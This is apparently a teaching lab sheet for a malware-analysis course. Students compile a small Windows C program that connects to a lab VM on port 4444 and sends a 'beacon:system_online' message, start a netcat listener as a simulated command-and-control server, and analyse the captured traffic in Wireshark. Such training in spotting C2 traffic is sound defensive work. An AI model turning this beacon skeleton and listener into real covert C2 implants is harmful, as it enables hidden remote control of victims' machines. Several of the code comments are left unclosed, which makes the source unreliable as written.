@@ -1,0 +1,118 @@
+Part A
+Experiment 5: Analyze the captured network traffic from the malware
+execution to identify potential command and control (C2)
+communications or data exfiltration attempts. Extract indicators of
+compromise such as IP addresses or domain names.
+Tool: Wireshark
+
+Tools Used
+ MinGW-w64 (Ubuntu)
+ Wine (Ubuntu)
+ Wireshark (Kali Linux)
+ Netcat (Metasploitable 2)
+
+PART A: Creating sample.exe in Ubuntu VM
+Step 1: Install Required Packages (Ubuntu VM)
+sudo apt update
+sudo apt install mingw-w64 wine
+This installs:
+ MinGW-w64 → to compile .exe
+ Wine → to execute .exe
+
+Step 2: Create Working Directory
+
+mkdir malware_lab
+cd malware_lab
+
+Step 3: Create Source Code File
+vi sample.c
+#include &lt;winsock2.h&gt;
+#include &lt;windows.h&gt;
+int main() {
+WSADATA wsa; /* it stores the information about winsock version
+SOCKET sock;
+struct sockaddr_in server;
+char message[] = &quot;beacon:system_online&quot;;
+WSAStartup(MAKEWORD(2,2), &amp;wsa); /* Initializes winsock library
+sock = socket(AF_INET, SOCK_STREAM, 0); /* Creates a TCP socket
+and it is used for Backdoors, C2 channels
+// Fake C2 server (Metasploitable 2 IP)
+server.sin_addr.s_addr = inet_addr(&quot;192.168.56.101&quot;); /* Converts ip
+address from string to binary format ..you can use metaspoiltable2 vm
+ip
+server.sin_family = AF_INET;
+server.sin_port = htons(4444);
+connect(sock, (struct sockaddr *)&amp;server, sizeof(server));
+
+send(sock, message, sizeof(message), 0);
+closesocket(sock);
+WSACleanup();
+return 0;
+}
+Save and exit.
+
+Step 4: Compile Windows Executable in Ubuntu
+x86_64-w64-mingw32-gcc sample.c -o sample.exe -lws2_32
+
+Step 5: Verify Executable
+file sample.exe
+Expected output:
+PE32+ executable (console) x86-64, for MS Windows
+✔ Confirms successful creation of sample.exe
+
+PART B: Preparing C2 Server (Metasploitable 2)
+
+Step 6: Check IP Address
+ifconfig
+Example:
+
+192.168.56.101
+(This must match the IP hardcoded in sample.c)
+
+Step 7: Start Fake C2 Listener
+nc -lvnp 4444
+This simulates a Command &amp; Control server.
+
+PART C: Capturing Traffic in Kali Linux
+
+Step 8: Start Wireshark (Kali)
+wireshark
+ Select Host-Only network interface
+ Click Start Capture
+
+PART D: Executing sample.exe in Ubuntu VM
+
+Step 10: Execute sample.exe Using Wine
+wine sample.exe
+The program:
+ Runs silently
+ Creates an outbound TCP connection
+
+ Sends a beacon message
+
+PART E: Wireshark Analysis (Kali Linux)
+
+Step 11: Stop Capture
+Save as:
+malware_traffic.pcapng
+
+Step 12: Apply Wireshark Filters
+Show TCP traffic
+tcp
+Show C2 traffic
+ip.addr == 192.168.56.101 &lt;Metaspoiltable-ip&gt;
+Show suspicious port
+tcp.port == 4444
+
+Step 13: Inspect Payload
+1. Right-click packet
+2. Follow → TCP Stream
+Observed payload:
+beacon:system_online
+
+RESULT
+The malware sample generated suspicious outbound network traffic
+indicative of Command and Control (C2) communication, which was
+successfully captured and analyzed using Wireshark.
+Wine was used to execute the Windows executable safely on Ubuntu
+for controlled malware analysis in an isolated environment.
